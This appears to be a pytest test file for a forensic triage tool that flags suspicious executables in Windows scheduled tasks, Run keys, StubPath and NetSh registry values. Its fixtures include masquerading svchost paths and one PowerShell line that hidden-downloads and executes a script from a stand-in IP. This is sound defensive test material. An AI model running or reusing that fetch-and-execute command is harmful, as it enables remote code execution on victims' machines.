"""Triage checks the executable a scheduled task or Run key starts, reads every
Run-key variant, and says when a Run value is too long to read.

check_file gets the executable a command line starts (a quoted path, the
shortest prefix ending in an executable extension before a space, a RunOnceEx
"||cmd" or "file|Function"), the file rundll32 loads (its first argument as
Windows splits a command line, ",Entry" or ",#n" cut, a path with an
executable extension; no other line names a file it runs) and, as before, the
value itself; each document gets
the worst answer at its highest confidence, flagged LOLBin if any answer was.
Tasks count the values sent (`checked`) and those that name no executable
(`not_checked`). RunOnce, RunOnceEx, RunServices and RunServicesOnce are read
beside Run; Explorer\\RunMRU is not. A Run value over
256 characters has no keyword term, so it can't be read: it is counted
(`too_long`), fails the step, and the reason says how to find it. StubPath
and NetSh stamps carry the confidence and the LOLBin flag, as Run keys do.

OpenSearch is a stand-in that runs the queries triage sends, with `.keyword`
dropping values over 256 characters as `ignore_above` does; check_file answers
by exact string, so what was sent shows in each stamp.
"""

from __future__ import annotations

import fnmatch
import re

import pytest

from opensearch_mcp import triage_remote as tr

SUSP = {"verdict": "SUSPICIOUS", "confidence": "high", "reasons": ["masquerade"]}
LOLBIN = {"verdict": "EXPECTED_LOLBIN", "confidence": "high", "reasons": ["lolbin"],
          "is_lolbin": True}  # fmt: skip
UNKNOWN = {"verdict": "UNKNOWN", "confidence": "low", "reasons": ["Not in baseline"]}


def _field(doc, name):
    if name.endswith(".keyword"):
        v = doc.get(name[: -len(".keyword")])
        return None if isinstance(v, str) and len(v) > 256 else v  # ignore_above 256
    return doc.get(name)


def _wildcard(pattern):
    out = re.sub(r"\\(.)|(\*)|(.)", lambda m: re.escape(m[1]) if m[1] is not None
                 else ".*" if m[2] else re.escape(m[3]), pattern)  # fmt: skip
    return re.compile(out + r"\Z", re.S)


def _match(q, doc) -> bool:
    ((kind, body),) = q.items()
    if kind == "match_all":
        return True
    if kind == "bool":
        must = [*body.get("must", []), *body.get("filter", [])]
        should, msm = body.get("should", []), body.get("minimum_should_match", 0 if must else 1)
        return (all(_match(c, doc) for c in must)
                and not any(_match(c, doc) for c in body.get("must_not", []))
                and (not should or not msm
                     or sum(_match(c, doc) for c in should) >= msm))  # fmt: skip
    ((f, v),) = body.items() if kind != "exists" else [(body["field"], None)]
    if kind == "term":
        return _field(doc, f) == v
    if kind == "terms":
        return _field(doc, f) in v
    if kind == "wildcard":
        return isinstance(_field(doc, f), str) and bool(_wildcard(v).match(_field(doc, f)))
    if kind == "exists":
        return _field(doc, f) is not None
    if kind == "query_string":
        return v == "*"
    raise AssertionError(f"query not modelled: {q}")


class Cluster:
    def __init__(self, indices):
        self.store = indices

        class Indices:
            def refresh(self, **kw):
                return {}

        self.indices = Indices()

    def _docs(self, index):
        names = [n for n in self.store for p in str(index).split(",")
                 if p and not p.startswith("-") and fnmatch.fnmatchcase(n, p)]  # fmt: skip
        return [d for n in dict.fromkeys(names) for d in self.store[n]]

    def search(self, index=None, body=None, **kw):
        hits = [d for d in self._docs(index) if _match(body.get("query", {"match_all": {}}), d)]
        out = {"hits": {"total": {"value": len(hits)}, "hits": []}}
        for name, agg in (body.get("aggs") or {}).items():
            counts: dict = {}
            for d in hits:
                if (v := _field(d, agg["terms"]["field"])) is not None:
                    counts[v] = counts.get(v, 0) + 1
            buckets = [{"key": k, "doc_count": n} for k, n in counts.items()]
            out.setdefault("aggregations", {})[name] = {
                "buckets": buckets,
                "sum_other_doc_count": 0,
            }
        return out

    def update_by_query(self, index=None, body=None, **kw):
        src, params = body["script"]["source"], body["script"].get("params") or {}
        hits = [d for d in self._docs(index) if _match(body["query"], d)]
        if "params.verdict" in src:
            for d in hits:
                d["triage.verdict"] = params["verdict"]
                d["triage.lolbin"] = d.get("triage.lolbin") or "triage.lolbin'] = true" in src
                if "params.confidence" in src:
                    d["triage.confidence"] = params["confidence"]
        return {"updated": len(hits) if "params.verdict" in src else 0, "total": len(hits)}


@pytest.fixture
def triage(monkeypatch):
    """Run triage over `indices` with a check_file that answers by exact string;
    returns the step results, what check_file got and each doc's stamp."""

    def run(indices, table):
        sent = []

        def call_tool(name, args, timeout=None):
            if name != "check_file":
                return {}
            sent.append(args["path"])
            answer = table.get(args["path"], UNKNOWN)
            if isinstance(answer, Exception):
                raise answer
            return dict(answer) if isinstance(answer, dict) else answer

        monkeypatch.setattr(tr, "call_tool", call_tool)
        monkeypatch.setattr(tr, "gateway_available", lambda: True)
        cluster = Cluster(indices)
        results = tr.enrich_remote(cluster, "cmdline")
        stamps = {d["_id"]: (d.get("triage.verdict"), bool(d.get("triage.lolbin")))
                  for docs in indices.values() for d in docs}  # fmt: skip
        return results, set(sent), stamps

    return run


TASKS = {
    "t1": "%windir%\\Temp\\svchost.exe",
    "t2": "powershell.exe",
    "t3": '"C:\\Users\\Public\\svchost.exe"',
    "t4": "C:\\Program Files\\Vendor App\\upd.exe",
    "t5": '"C:\\Program Files\\Vendor App\\upd.exe"',
    "t6": "C:\\Windows\\System32\\rundll32.exe",
    "t7": "UpdaterTask",
    "t8": "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\Public\\evil.bat",
    "t9": "C:\\Users\\Public\\run.vbs /x",
    "t10": "\\\\fileserver\\share\\evil.exe /q",
    "t11": "\\??\\C:\\Users\\Public\\svchost.exe",
}
TASK_ANSWERS = {
    "%windir%\\Temp\\svchost.exe": SUSP, "powershell.exe": LOLBIN,
    "C:\\Users\\Public\\svchost.exe": SUSP, "C:\\Program Files\\Vendor App\\upd.exe": SUSP,
    "C:\\Windows\\System32\\rundll32.exe": LOLBIN, "C:\\Windows\\System32\\cmd.exe": LOLBIN,
    "C:\\Users\\Public\\run.vbs": SUSP, "\\\\fileserver\\share\\evil.exe": SUSP,
    "\\??\\C:\\Users\\Public\\svchost.exe": SUSP,
}  # fmt: skip


def test_a_task_is_checked_by_the_executable_it_starts_and_as_before(triage):
    docs = [{"_id": i, "task.command": v} for i, v in TASKS.items()]
    results, sent, stamps = triage({"case-cmdline-tasks-h1": docs}, TASK_ANSWERS)
    # the executables (a bare name is none), and each command sent before
    # that differs
    assert sent == (set(TASK_ANSWERS) - {"powershell.exe"}) | {
        TASKS["t8"],
        TASKS["t9"],
        TASKS["t10"],
    }
    assert stamps == {
        "t1": ("SUSPICIOUS", False), "t2": (None, False), "t3": ("SUSPICIOUS", False),
        "t4": ("SUSPICIOUS", False), "t5": ("SUSPICIOUS", False), "t6": ("UNKNOWN", True),
        "t7": (None, False), "t8": ("UNKNOWN", True), "t9": ("SUSPICIOUS", False),
        "t10": ("SUSPICIOUS", False), "t11": ("SUSPICIOUS", False),
    }  # fmt: skip
    task = results["tasks"]
    assert (task["checked"], task["not_checked"], task["status"]) == (9, 2, "complete")


RUN = "ROOT\\Microsoft\\Windows\\CurrentVersion\\Run"
IFEO = "ROOT\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
SETUP = "ROOT\\Microsoft\\Active Setup\\Installed Components\\"


def _reg(i, key, data):
    return {"_id": i, "KeyPath": key, "ValueName": i, "ValueData": data}


def test_a_run_key_or_stubpath_is_checked_by_its_executable_and_as_before(triage):
    svchost = "C:\\Users\\Public\\svchost.exe"
    values = [
        ("r1", RUN, f'"{svchost}" -k netsvcs'),
        ("r2", RUN, "C:\\Windows\\System32\\rundll32.exe "
                    "C:\\Users\\bob\\AppData\\Roaming\\x.dll,Start"),
        ("r3", RUN, "C:\\Program Files\\Vendor App\\agent.exe /background"),
        ("r4", RUN, "%ProgramFiles%\\Windows Defender\\MSASCuiL.exe"),
        ("r5", RUN, svchost),
        ("r6", IFEO, svchost),
        ("w1", RUN, f"C:\\Windows\\System32\\cmd.exe /c start {svchost}"),
        ("w2", RUN, f"C:\\Windows\\System32\\rundll32.exe {svchost}"),
        ("b4", RUN, f"cmd /c start {svchost}"),
        ("r7", RUN, "C:\\Users\\Public\\run.ps1 -x"),
        ("r8", RUN, "\\\\fileserver\\share\\evil.exe /q"),
        ("s1", SETUP + "{A}", '"C:\\ProgramData\\x\\svchost.exe" /install'),
        ("s2", SETUP + "{B}", "%SystemRoot%\\system32\\unregmp2.exe /FirstLogon /Shortcuts"),
    ]  # fmt: skip
    docs = [_reg(i, k, v) for i, k, v in values]
    for d in docs:
        if d["_id"].startswith("s"):
            d["ValueName"] = "StubPath"
    exes = {
        svchost: SUSP, "C:\\Windows\\System32\\rundll32.exe": LOLBIN,
        "C:\\Windows\\System32\\cmd.exe": LOLBIN, "C:\\Program Files\\Vendor App\\agent.exe": SUSP,
        "C:\\Users\\Public\\run.ps1": SUSP, "\\\\fileserver\\share\\evil.exe": SUSP,
        "C:\\ProgramData\\x\\svchost.exe": SUSP, "%SystemRoot%\\system32\\unregmp2.exe": LOLBIN,
    }  # fmt: skip
    # a LOLBin wrapper's whole line reads SUSPICIOUS (check_file reads its last path)
    wrappers = {v: SUSP for i, _, v in values if i in ("w1", "w2", "b4")}
    _, sent, stamps = triage({"case-cmdline-registry-h1": docs}, {**exes, **wrappers})
    targets = {"C:\\Users\\bob\\AppData\\Roaming\\x.dll"}  # what r2's rundll32 runs
    assert sent == {v for i, _, v in values if i != "r6"} | set(exes) | targets
    assert stamps == {
        "r1": ("SUSPICIOUS", False), "r2": ("UNKNOWN", True), "r3": ("SUSPICIOUS", False),
        "r4": ("UNKNOWN", False), "r5": ("SUSPICIOUS", False), "r6": (None, False),
        "w1": ("SUSPICIOUS", True), "w2": ("SUSPICIOUS", True), "b4": ("SUSPICIOUS", False),
        "r7": ("SUSPICIOUS", False), "r8": ("SUSPICIOUS", False),
        "s1": ("SUSPICIOUS", False), "s2": ("UNKNOWN", True),  # StubPath writes the LOLBin flag
    }  # fmt: skip


def test_every_run_key_variant_is_read_but_not_runmru(triage):
    cv = "ROOT\\Microsoft\\Windows\\CurrentVersion\\"
    keys = {
        "k1": (cv + "Run", "C:\\Users\\Public\\k1.exe"),
        "k2": ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
               "C:\\Users\\Public\\k2.exe"),
        "k3": (cv + "RunOnce", "C:\\Users\\Public\\k3.exe"),
        "k4": (cv + "RunOnce\\Setup", "C:\\Users\\Public\\k4.exe"),
        "k5": (cv + "RunOnceEx\\0001", "||C:\\Users\\Public\\k5.exe"),
        "k9": (cv + "RunOnceEx\\0002", "C:\\Users\\Public\\k9.dll|DllRegisterServer"),
        "k6": (cv + "RunServices", "C:\\Users\\Public\\k6.exe"),
        "k7": (cv + "RunServicesOnce", "C:\\Users\\Public\\k7.exe"),
        "k8": (cv + "Policies\\Explorer\\Run", "C:\\Users\\Public\\k8.exe"),
        "n1": (cv + "Explorer\\RunMRU", "C:\\Users\\Public\\n1.exe"),  # typed commands
    }  # fmt: skip
    docs = [_reg(i, k, v) for i, (k, v) in keys.items()]
    exe = {i: v for i, (_, v) in keys.items()}  # RunOnceEx's own formats name theirs:
    exe.update(k5="C:\\Users\\Public\\k5.exe", k9="C:\\Users\\Public\\k9.dll")
    # only the executables answer SUSPICIOUS: each doc's stamp shows its own was sent
    _, sent, stamps = triage({"case-cmdline-registry-h1": docs}, {e: SUSP for e in exe.values()})
    run = [i for i in keys if i != "n1"]
    assert sent == {keys[i][1] for i in run} | {exe[i] for i in run}
    assert all(stamps[i] == ("SUSPICIOUS", False) for i in run) and stamps["n1"] == (None, False)


@pytest.mark.parametrize("short", [True, False], ids=["beside a short value", "alone"])
def test_a_run_value_too_long_to_read_is_counted_and_fails_the_step(triage, short):
    long_value = "C:\\Users\\Public\\" + "x" * 295 + ".exe"
    assert len(long_value) > 256
    docs = [_reg("long", RUN, long_value)]
    if short:  # two docs hold it, so a count of total minus buckets would say 2
        docs += [_reg("s1", RUN, "C:\\Users\\Public\\short.exe"),
                 _reg("s2", RUN, "C:\\Users\\Public\\short.exe")]  # fmt: skip
    results, sent, _ = triage({"case-cmdline-registry-h1": docs}, {})
    run = results["registry_run"]
    assert run["status"] == "failed" and run["too_long"] == 1, run
    assert "256" in run["reason"] and long_value not in sent


def test_a_value_is_answered_only_when_every_lookup_for_it_answered(triage):
    """The executable answers, the whole line times out: as when the line's
    one lookup failed before, the step isn't complete and nothing is written
    over the document's earlier stamp."""
    line = "C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\svchost.exe"
    doc = {**_reg("w1", RUN, line), "triage.verdict": "SUSPICIOUS"}
    table = {"C:\\Windows\\System32\\cmd.exe": LOLBIN, line: TimeoutError("timed out")}
    results, _, stamps = triage({"case-cmdline-registry-h1": [doc]}, table)
    assert results["registry_run"]["status"] == "failed", results["registry_run"]
    assert stamps["w1"] == ("SUSPICIOUS", False)


def test_a_lookup_answered_without_a_verdict_fails_the_value(triage):
    """A backend error comes back as a reply with no verdict: it answers
    nothing, so the value fails as a timed-out lookup does."""
    line = "C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\svchost.exe"
    doc = {**_reg("w1", RUN, line), "triage.verdict": "SUSPICIOUS"}
    table = {"C:\\Windows\\System32\\cmd.exe": LOLBIN, line: {"error": "backend error"}}
    results, _, stamps = triage({"case-cmdline-registry-h1": [doc]}, table)
    assert results["registry_run"]["status"] == "failed", results["registry_run"]
    assert stamps["w1"] == ("SUSPICIOUS", False)


@pytest.mark.parametrize("lookups", [2, 1])
def test_a_reply_that_isnt_a_dict_never_escapes(triage, lookups):
    """A list reply is a failed call, with one lookup or two: the value
    fails, nothing is written, and the run goes on."""
    line = "C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\svchost.exe"
    value = line if lookups == 2 else "C:\\Users\\Public\\svchost.exe"
    doc = {**_reg("w1", RUN, value), "triage.verdict": "SUSPICIOUS"}
    table = {"C:\\Windows\\System32\\cmd.exe": LOLBIN, value: ["not", "a", "dict"]}
    results, _, stamps = triage({"case-cmdline-registry-h1": [doc]}, table)
    assert results["registry_run"]["status"] == "failed", results["registry_run"]
    assert stamps["w1"] == ("SUSPICIOUS", False)


# --- the files a command line runs, the long values' query, StubPath and NetSh -

S32 = "C:\\Windows\\System32\\"
SVCHOST = "C:\\Users\\Public\\svchost.exe"
SUSP_MED = {"verdict": "SUSPICIOUS", "confidence": "medium", "reasons": ["unexpected dir"]}
EXPECTED = {"verdict": "EXPECTED", "confidence": "high", "reasons": ["Path matches baseline"]}
NETSH = "ROOT\\Microsoft\\NetSh"
UNREGMP2 = "%SystemRoot%\\system32\\unregmp2.exe"


def full(docs):
    """Each doc's stamp: verdict, LOLBin flag, confidence."""
    return {d["_id"]: (d.get("triage.verdict"), bool(d.get("triage.lolbin")),
                       d.get("triage.confidence")) for d in docs}  # fmt: skip


LINES = {
    "start": f"rundll32.exe {SVCHOST},Start",
    "quoted-dll": f'{S32}rundll32.exe "C:\\Program Files\\Vendor App\\x.dll",Start',
    "cmd-start": f"cmd /c start {SVCHOST} -hidden",
    "cpl": f"{S32}rundll32.exe C:\\Users\\Public\\p.cpl",
    "nested": f"cmd /c start {S32}rundll32.exe {SVCHOST},Start",
    "cmd-nested": f"{S32}cmd.exe /c {S32}rundll32.exe {SVCHOST},Start",
    "benign-first": f"{S32}rundll32.exe {S32}shell32.dll,ShellExec_RunDLL {SVCHOST} -q",
    "payload-first": f"{S32}rundll32.exe C:\\Users\\Public\\x2.dll,Run {S32}notepad.exe",
    "quoted-multi": f'cmd /c "{SVCHOST} & C:\\x\\b.exe"',
    "quoted-exe": f'"{SVCHOST}" -k netsvcs',
    "txt-arg": "C:\\Program Files\\Vendor App\\agent.exe /background C:\\x\\a.txt",
    "last-path": f"{S32}rundll32.exe {SVCHOST}",
    "tie": f"{S32}rundll32.exe C:\\Users\\Public\\w3.dll",
}
STUB_LINE = "rundll32.exe C:\\ProgramData\\x\\y.dll,Install"
ANSWERS = {
    SVCHOST: SUSP, "C:\\Program Files\\Vendor App\\x.dll": SUSP, "C:\\Users\\Public\\p.cpl": SUSP,
    "C:\\ProgramData\\x\\y.dll": SUSP, "C:\\Users\\Public\\x2.dll": SUSP,
    f"{S32}rundll32.exe": LOLBIN, f"{S32}cmd.exe": LOLBIN,
    f"{S32}shell32.dll": EXPECTED, f"{S32}notepad.exe": EXPECTED,
    "C:\\Program Files\\Vendor App\\agent.exe": UNKNOWN,
    LINES["last-path"]: SUSP,  # check_file reads a line's last path
    # the whole line high, the file it runs medium: the same verdict, the surer kept
    LINES["tie"]: SUSP, "C:\\Users\\Public\\w3.dll": SUSP_MED,
}  # fmt: skip


def test_the_file_rundll32_loads_is_checked_and_the_worst_answer_is_kept(triage):
    docs = [_reg(i, RUN, v) for i, v in LINES.items()]
    docs.append({**_reg("stub-dll", SETUP + "{C}", STUB_LINE), "ValueName": "StubPath"})
    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, ANSWERS)
    loads = {SVCHOST, "C:\\Program Files\\Vendor App\\x.dll", "C:\\Users\\Public\\p.cpl",
             "C:\\ProgramData\\x\\y.dll", "C:\\Users\\Public\\x2.dll", f"{S32}shell32.dll",
             "C:\\Users\\Public\\w3.dll"}  # fmt: skip
    # never an entry point, a later argument, or anything a non-rundll32 line names
    never = {f"{SVCHOST},Start", "C:\\ProgramData\\x\\y.dll,Install", f"{SVCHOST} -hidden",
             f"{SVCHOST} & C:\\x\\b.exe", "C:\\x\\b.exe", "C:\\x\\a.txt",
             "C:\\Users\\Public\\x2.dll,Run", f"{S32}notepad.exe"}  # fmt: skip
    assert loads <= sent and not never & sent, (loads - sent, never & sent)
    high, flagged = ("SUSPICIOUS", False, "high"), ("SUSPICIOUS", True, "high")
    unknown, unknown_flagged = ("UNKNOWN", False, "low"), ("UNKNOWN", True, "low")
    assert full(docs) == {
        "start": high, "quoted-exe": high, "stub-dll": high,
        "quoted-dll": flagged, "cpl": flagged, "payload-first": flagged, "last-path": flagged,
        "tie": flagged,
        # cmd and start lines name no file of their own: as they were before
        "cmd-start": unknown, "nested": unknown, "cmd-nested": unknown_flagged,
        "benign-first": unknown_flagged,  # rundll32 loads shell32.dll, a baseline file
        "quoted-multi": unknown, "txt-arg": unknown,
    }  # fmt: skip


RUNS = {  # how rundll32 can be written; each loads the svchost.exe in Public
    "o1": f"rundll32.exe {SVCHOST},Start",
    "bare": f"rundll32 {SVCHOST},Start",
    "ordinal": f"rundll32.exe {SVCHOST},#1",
    "quoted-upper": f'"C:\\Windows\\System32\\RUNDLL32.EXE" {SVCHOST},Start',
    "space-entry": f"rundll32.exe {SVCHOST} Start",
}


@pytest.mark.parametrize("line", list(RUNS.values()), ids=list(RUNS))
def test_every_way_of_writing_rundll32_checks_the_file_it_loads(triage, line):
    docs = [_reg("r", RUN, line)]
    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, {SVCHOST: SUSP})
    assert SVCHOST in sent and full(docs)["r"] == ("SUSPICIOUS", False, "high")


NAMES_NO_TARGET = {  # a file these name isn't one they run
    "echo-quoted": f'cmd /c echo "Checking {SVCHOST} now">NUL',
    "echo": f"cmd /c echo {SVCHOST} > NUL",
    "del-quoted": 'cmd.exe /q /c del /q "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive'
                  '\\Update\\OneDriveSetup.exe"',
    "del": f"cmd /c del {SVCHOST}",
    "control-panel": "rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Public\\x.cpl",
    "editor": f"notepad.exe {SVCHOST}",  # opened, not run: only rundll32's argument is
    "rundll32-text": "rundll32.exe C:\\Users\\Public\\notes.txt,Start",  # no executable extension
}  # fmt: skip


@pytest.mark.parametrize("line", list(NAMES_NO_TARGET.values()), ids=list(NAMES_NO_TARGET))
def test_a_file_a_line_only_names_isnt_checked_as_one_it_runs(triage, line):
    table = {SVCHOST: SUSP, "C:\\Users\\Public\\x.cpl": SUSP, "C:\\Users\\Public\\notes.txt": SUSP}
    docs = [_reg("n", RUN, line)]
    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, table)
    assert sent == {line}  # the line itself, as before: nothing it names
    assert full(docs)["n"] == ("UNKNOWN", False, "low")


@pytest.mark.parametrize("dll", ["C:\\Users\\Public\\R&D\\svchost.exe",
                                 "C:\\Program Files (x86)\\AT&T\\x.dll"],
                         ids=["R&D", "AT&T"])  # fmt: skip
def test_a_quoted_rundll32_file_with_an_ampersand_is_checked(triage, dll):
    docs = [_reg("amp", RUN, f'rundll32.exe "{dll}",Start')]
    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, {dll: SUSP})
    assert dll in sent and full(docs)["amp"] == ("SUSPICIOUS", False, "high")


@pytest.mark.parametrize("tail", [".dll,Start", "x.dll"])
def test_a_quoted_path_glued_to_more_text_is_one_file(triage, tail):
    """Windows joins `"…svchost.exe".dll` into one argument: that file is
    checked, never the quoted part alone."""
    line = f'rundll32.exe "{SVCHOST}"{tail}'
    docs = [_reg("glued", RUN, line)]
    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, {SVCHOST: SUSP})
    assert SVCHOST not in sent and SVCHOST + tail.split(",")[0] in sent, sent
    assert full(docs)["glued"] == ("UNKNOWN", False, "low")


# Microsoft's table for CommandLineToArgvW ("Parsing C++ command-line
# arguments"), the arguments after the program, and the program's own rule
ARGV = [
    ('"abc" d e', ["abc", "d", "e"]),
    ('a\\\\b d"e f"g h', ["a\\\\b", "de fg", "h"]),
    ('a\\\\\\"b c d', ['a\\"b', "c", "d"]),
    ('a\\\\\\\\"b c" d e', ["a\\\\b c", "d", "e"]),
    ('a"b"" c d', ['ab" c d']),
]  # fmt: skip


@pytest.mark.parametrize("line,args", ARGV, ids=[a for a, _ in ARGV])
def test_a_command_line_is_split_as_windows_splits_it(line, args):
    assert tr._argv(f"p {line}") == ["p", *args]
    # the program: to its closing quote, no escapes; or to the first space
    assert tr._argv(f'"C:\\dir\\a b.exe" {line}')[0] == "C:\\dir\\a b.exe"


def test_only_a_program_with_a_rule_has_a_file_it_runs():
    assert set(tr._RUNS) == {"rundll32", "rundll32.exe"}
    assert tr._target_of(f"C:\\Windows\\System32\\rundll32.exe {SVCHOST},Start") == SVCHOST
    assert tr._target_of(f"C:\\Windows\\System32\\regsvr32.exe {SVCHOST}") is None


LONG = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c "
        "\"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\" "
        + "#" * 400)[:315]  # fmt: skip
FINDS_THEM = {"bool": {"filter": [{"exists": {"field": "ValueData"}}],
                       "must_not": [{"exists": {"field": "ValueData.keyword"}}]}}  # fmt: skip


@pytest.mark.parametrize("short", [True, False], ids=["beside short values", "alone"])
def test_the_reason_says_how_to_find_the_run_values_too_long_to_read(triage, short):
    docs = [{**_reg("l1", RUN, LONG), "ValueName": "Updater"}]
    if short:  # two docs share one short value, and a Run value with no data
        docs += [{**_reg("s1", RUN, "C:\\Users\\Public\\short.exe"), "ValueName": "Short1"},
                 {**_reg("s2", RUN, "C:\\Users\\Public\\short.exe"), "ValueName": "Short1"},
                 {"_id": "n0", "KeyPath": RUN, "ValueName": "(default)"}]  # fmt: skip
    results, sent, _ = triage({"case-cmdline-registry-h1": docs}, {})
    run = results["registry_run"]
    assert (run["status"], run["too_long"]) == ("failed", 1), run
    assert run["reason"] == (
        "1 Run-key values are over 256 characters and were not checked; find them with "
        "exists ValueData and not exists ValueData.keyword under the Run keys"
    )
    assert LONG not in sent
    assert [d["_id"] for d in docs if _match(FINDS_THEM, d)] == ["l1"]  # the query it states


def test_stubpath_and_netsh_stamps_carry_the_lolbin_flag_and_confidence(triage):
    docs = [
        {**_reg("s1", SETUP + "{A}", '"C:\\ProgramData\\x\\svchost.exe" /install'),
         "ValueName": "StubPath"},
        {**_reg("s2", SETUP + "{B}", f"{UNREGMP2} /FirstLogon /Shortcuts"),
         "ValueName": "StubPath"},
        {**_reg("n1", NETSH, f"{S32}advpack.dll"), "ValueName": "helper1"},
        {**_reg("n2", NETSH, "C:\\Users\\Public\\nh.dll"), "ValueName": "helper2"},
    ]  # fmt: skip
    table = {"C:\\ProgramData\\x\\svchost.exe": SUSP,
             UNREGMP2: LOLBIN,
             f"{S32}advpack.dll": LOLBIN, "C:\\Users\\Public\\nh.dll": SUSP}  # fmt: skip
    triage({"case-cmdline-registry-h1": docs}, table)
    assert full(docs) == {
        "s1": ("SUSPICIOUS", False, "high"), "s2": ("UNKNOWN", True, "low"),
        "n1": ("UNKNOWN", True, "low"), "n2": ("SUSPICIOUS", False, "high"),
    }  # fmt: skip
